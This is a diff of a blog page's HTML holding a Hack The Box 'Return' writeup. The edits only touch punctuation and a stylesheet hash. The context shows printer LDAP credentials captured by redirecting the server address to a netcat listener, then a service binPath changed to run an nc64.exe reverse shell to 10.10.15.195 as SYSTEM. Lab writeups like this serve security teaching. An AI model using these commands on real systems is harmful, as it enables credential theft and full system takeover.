@@ -51,7 +51,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-return/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -207,8 +207,8 @@ stroke-linejoin="round" class="feather feather-home">
 <h2 id="stealing-credentials-from-the-printer-panel">Stealing Credentials from the Printer Panel</h2>
 <p>The web app is a &ldquo;HTB Printer Admin Panel&rdquo; with a Settings page that shows the printer&rsquo;s LDAP configuration:</p>
 <p><img src="/images/writeups/htb-return/web-printer-settings-svc-printer.png" alt="Settings page showing Server Address: printer.return.local, Server Port: 389, Community String, Username: svc-printer, Password: *******"></p>
-<p>Server Address, port 389 (LDAP), username <code>svc-printer</code>, and a password hidden behind asterisks. The obvious thing to try first was to fill in the password field with something and submit, hoping the form would reveal the stored value or accept any input. It didn&rsquo;t. Changing the password to <code>Password123!</code> and submitting just updated the field without giving anything away. Tried the same thing directly through Burp with a modified POST body - same result.</p>
-<p>The insight is in how printer firmware handles LDAP configuration. The device stores LDAP credentials so it can bind to a directory server for things like address book lookups or user authentication. When you submit the settings form, the printer doesn&rsquo;t just save the values - it immediately tries to connect to the configured Server Address and bind, to test whether the configuration works.</p>
+<p>Server Address, port 389 (LDAP), username <code>svc-printer</code>, and a password hidden behind asterisks. The obvious thing to try first was to fill in the password field with something and submit, hoping the form would reveal the stored value or accept any input. It didn&rsquo;t. Changing the password to <code>Password123!</code> and submitting just updated the field without giving anything away. Tried the same thing directly through Burp with a modified POST body, same result.</p>
+<p>The insight is in how printer firmware handles LDAP configuration. The device stores LDAP credentials so it can bind to a directory server for things like address book lookups or user authentication. When you submit the settings form, the printer doesn&rsquo;t just save the values. It immediately tries to connect to the configured Server Address and bind, to test whether the configuration works.</p>
 <p>If you change the Server Address to your IP and leave everything else alone, the printer will attempt to bind to your machine on port 389 using its stored credentials. LDAP bind requests carry credentials in plaintext when not using TLS. A netcat listener on port 389 catches the raw bind packet:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nc -lvnp <span class="m">389</span>
 </span></span><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">389</span>
@@ -251,7 +251,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
 SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
 SeTimeZonePrivilege           Change the time zone                Enabled
-</code></pre><p>Several paths to SYSTEM from here - SeBackupPrivilege, SeLoadDriverPrivilege, and Server Operators itself. I&rsquo;d already done the SeBackupPrivilege registry hive dump in the Cicada writeup, so I went with Server Operators instead.</p>
+</code></pre><p>Several paths to SYSTEM from here, SeBackupPrivilege, SeLoadDriverPrivilege, and Server Operators itself. I&rsquo;d already done the SeBackupPrivilege registry hive dump in the Cicada writeup, so I went with Server Operators instead.</p>
 <p>Server Operators is a built-in Windows group meant for local administration tasks on domain controllers: managing services, starting and stopping them, backing up files. The key permission it grants is <code>SC_MANAGER_ALL_ACCESS</code> on the Service Control Manager, which means members can modify service configuration including the binary path. When you change a service&rsquo;s <code>binPath</code> to an arbitrary command, the SCM executes that command as SYSTEM when the service starts, because Windows services run under SYSTEM by default unless explicitly configured otherwise.</p>
 <p><code>VMTools</code> was the target. Uploaded nc64.exe to the desktop first, then:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sc.exe config VMTools <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\Users\svc-printer\Desktop\nc64.exe -e cmd.exe 10.10.15.195 9001&#34;</span>
@@ -262,7 +262,7 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 </span></span><span class="line"><span class="cl">The service has not been started.
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">sc.exe start VMTools
-</span></span></code></pre></div><p>The stop failed because VMTools wasn&rsquo;t running - that&rsquo;s fine. Starting it directly triggered the binary path:</p>
+</span></span></code></pre></div><p>The stop failed because VMTools wasn&rsquo;t running, that&rsquo;s fine. Starting it directly triggered the binary path:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">9001</span>
 </span></span><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">9001</span>
 </span></span><span class="line"><span class="cl">Connection received on 10.129.9.15 <span class="m">49769</span>
@@ -270,7 +270,7 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 </span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</span></span></code></pre></div><p>SYSTEM. Root flag. The printer trick is the one to remember from this box. Point it at your netcat listener and it hands you credentials without any exploitation at all - just a configuration field pointing at the wrong place. This works on real printers in real environments because the firmware was designed to test its own LDAP settings, and nobody thought about what happens when the server address is malicious.</p>
+</span></span></code></pre></div><p>SYSTEM. Root flag. The printer trick is the one to remember from this box. Point it at your netcat listener and it hands you credentials without any exploitation at all, just a configuration field pointing at the wrong place. This works on real printers in real environments because the firmware was designed to test its own LDAP settings, and nobody thought about what happens when the server address is malicious.</p>
 
             </div>
         </article></main>
@@ -395,6 +395,11 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
